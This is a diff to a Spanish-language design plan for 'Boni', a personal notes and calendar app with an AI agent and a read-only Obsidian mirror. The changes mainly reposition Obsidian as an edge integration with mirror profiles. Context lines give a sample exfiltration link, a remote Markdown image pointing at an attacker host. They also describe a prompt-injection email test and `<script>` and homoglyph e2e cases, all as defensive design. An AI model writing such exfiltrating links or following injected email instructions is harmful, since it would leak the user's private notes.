@@ -42,6 +42,7 @@ Este repo pasará a llamarse `boni` (decisión de Juan, 2026-10-19), así que la
 | **Monorepo:** `boni-calendar` pasa a llamarse `boni`; el repo `boni` actual pasa a `boni-pruebas` y se archiva; lo útil de él entra con su historial | Decidido (Juan, 2026-10-19) |
 | **Exposición:** todo por tailnet; por Funnel solo una lista blanca de rutas (login y las del calendario que hoy son públicas) | Decidido (Juan, 2026-10-19) |
 | **Obsidian:** espejo Markdown de solo lectura; una edición a mano del espejo se convierte en propuesta; el plugin pasa a ser cliente del núcleo; migración colección a colección, la agenda la última | Decidido (Juan, 2026-10-19) |
+| **Obsidian es una integración por fuera, no un límite:** la comunidad de Obsidian debe poder aprovechar Boni y Boni Calendar, pero eso no condiciona lo que Boni puede hacer. Es una puerta para que la gente de Obsidian entre en Boni (sección 9.4) | Decidido (Juan, 2026-10-20) |
 | **El modelo puede leer y modificar el contenido de las notas**, como Claude con el vault. La seguridad la da la arquitectura, no esconderle los datos al proveedor. Matiza "las notas propias no deben salir" (plan, sección 1) para la fase del NAS | Decidido (Juan, 2026-10-19) |
 | Cada app (Boni y Boni Calendar, en móvil y escritorio) se sigue publicando por separado desde el mismo repo | Decidido (Juan, 2026-10-19) |
 | **Contenido externo = texto escrito por otros** (no una carpeta); `NotionImport/` son notas de Juan | Decidido (Juan, 2026-10-19) |
@@ -705,9 +706,10 @@ interface ViewSpec {
     diferencia con lo que hay. Lo lanza Juan, colección a colección, y la agenda va la última.
 
 ### 9.2 Espejo Markdown (solo lectura) y Obsidian
-- Para cada colección en modo `core`, el núcleo escribe en el vault una nota por entidad, **en el mismo formato de
-  hoy**: claves de Full Calendar, nombres `YYYY-MM-DD Título.md`, `Area: [[…]]`. Así las Bases de Obsidian siguen
-  funcionando. Para escribir reutiliza las reglas de `vault/provider.ts` (solo cambian las líneas editadas).
+- Para cada colección en modo `core`, el núcleo escribe en el vault una nota por entidad. El formato lo da un **perfil**
+  del espejo (9.4): el genérico (una carpeta por tipo, una propiedad por campo con su nombre) o uno que imita el de
+  hoy (claves de Full Calendar, nombres `YYYY-MM-DD Título.md`, `Area: [[…]]`), para que las Bases de Obsidian de Juan
+  sigan funcionando. Para escribir reutiliza las reglas de `vault/provider.ts` (solo cambian las líneas editadas).
 - **El espejo también es una salida.** Obsidian carga las imágenes remotas de una nota al abrirla, así que una
   `![](https://atacante/?d=…)` escrita en el espejo sacaría datos sin que nadie pulse nada. Además, otros agentes (Claude
   y Hermes por vault-mcp) leen el vault. Por eso:
@@ -720,6 +722,27 @@ interface ViewSpec {
   `imported`.
 - **El plugin de Obsidian pasa a ser cliente del núcleo** para esas colecciones (modo servidor, como las apps). Editar
   en el calendario dentro de Obsidian sigue funcionando y escribe en el núcleo, que actualiza el espejo.
+
+### 9.4 Obsidian, por fuera (decidido, Juan, 2026-10-20)
+Obsidian es una puerta de entrada a Boni, no una pieza del núcleo. Quien ya vive en Obsidian puede usar Boni Calendar
+dentro de su vault, traer su vault a Boni y seguir viendo sus datos como notas; pero Boni no deja de hacer algo porque
+no quepa en Markdown. En concreto:
+- **El núcleo no sabe de Obsidian.** `@boni/entities`, `@boni/store`, `@boni/agent` y `@boni/views` no importan nada
+  del vault ni de Obsidian (una prueba lo comprueba). Todo lo de Obsidian vive en el borde: `@boni/vault-import`
+  (entrada), el espejo (salida) y el plugin (un cliente más).
+- **Lo que Markdown no puede guardar se queda en el núcleo.** El espejo escribe lo que se puede representar y marca
+  el resto (por ejemplo, `boni_omitted: [historial, adjuntos]` en el frontmatter, y un enlace `boni://` a la entidad);
+  nunca se recorta una función de Boni para que el espejo quede completo. La exportación (9.3) sí lo lleva todo.
+- **El modo `vault` es una transición, no un destino.** Sirve para que alguien (Juan el primero) empiece con su vault
+  como verdad. En ese modo una colección solo tiene lo que sus notas pueden guardar; lo que necesite más (campos que
+  Markdown no expresa, historial por campo, vistas que el vault no tiene) pide pasarla a `core`, con su informe.
+- **El espejo tiene perfiles.** El genérico sirve a cualquier vault; el de Juan imita sus convenciones de hoy. Un perfil
+  es una traducción en el borde: elige nombres de archivo y claves, nunca cambia el modelo.
+- **El plugin de Boni Calendar funciona solo**, sobre un vault cualquiera y sin servidor, como hoy; conectarlo a un
+  servidor de Boni es opcional (PR 13). Para que sirva a la comunidad le falta no depender de las convenciones de Juan
+  (hoy necesita una definición en `_system/colecciones/`; tendrá que poder crearla desde sus ajustes eligiendo una
+  carpeta) y publicarse en el catálogo de plugins de Obsidian. Las dos cosas van aparte, después del plan, y publicar
+  lo hace Juan.
 
 ### 9.3 Exportación en un clic
 Un `.zip` con:
@@ -800,7 +823,7 @@ distinguidas por **dónde llegan** y nunca por cabeceras que se puedan falsifica
 |  | **Evaluación con el modelo real (2026-10-20, PR 68):** la primera ejecución falló entera con 400: la salida estructurada admite como mucho 24 parámetros opcionales y 16 con uniones, y el esquema del plan tiene muchos más. Desde entonces el planificador responde el plan en JSON de texto (lo valida el código, como siempre) y solo los lectores usan salida estructurada. El proveedor pasa al SDK oficial (`@anthropic-ai/sdk`, versión fija), con esfuerzo `medium` y `fallbacks: "default"` en el planificador. Ajustes por lo que hizo el modelo: el prompt describe la forma de cada resultado y que las funciones no se anidan, los lectores reciben la fecha de hoy y escriben en español, `entities.query` admite `contains`, y `when` y la etiqueta de control cambian (4.2). Resultado final: los 8 casos como se esperaba, 47.476 tokens, nada enviado; el correo con la inyección no produjo nada y su resumen lo señala como ataque. En 2 casos el primer plan no pasó la validación y el reintento sí | |
 | 12 | Boni web: conversación, confirmaciones pintadas por el código (reglas contra el engaño visual), bandeja, registro y deshacer, contenido externo solo como texto o en iframe aislado | e2e (incluido un correo con `<script>` que no se ejecuta, y una confirmación con RTL y homógrafos marcados), guarda de texto que cabe, móvil, CSP |
 |  | **12a hecho (2026-10-20, PR 69):** la web del primer Boni pasa a `apps/boni-web` con su historial (y sus e2e a `e2e-boni/`, el contrato v1 a `apps/boni-web/api/`); entra en Biome, tipos, pruebas y CI. Sigue hablando la API v1. La conversación es el 12b | |
-| 13 | Espejo (recursos remotos neutralizados, integridad en el frontmatter), propuestas de ediciones a mano, cambio de modo por colección, plugin en modo servidor | Vault inventado; editar el espejo crea una propuesta; una imagen remota de un texto externo no se carga en el Obsidian real (`make e2e-obsidian`) |
+| 13 | Espejo con perfiles (genérico y el de hoy; recursos remotos neutralizados, integridad y lo omitido en el frontmatter), propuestas de ediciones a mano, cambio de modo por colección, plugin con modo servidor opcional (sigue funcionando solo), prueba de que el núcleo no importa nada de Obsidian | Vault inventado; editar el espejo crea una propuesta; una imagen remota de un texto externo no se carga en el Obsidian real (`make e2e-obsidian`) |
 | 14 | Exportación en un clic | La exportación se vuelve a importar idéntica |
 | 15 | Primera colección en modo `core` (con Juan) y después el correo como fuente de propuestas (plan, paso 2) | Corpus ampliado con correos reales de forma (inventados) |
 
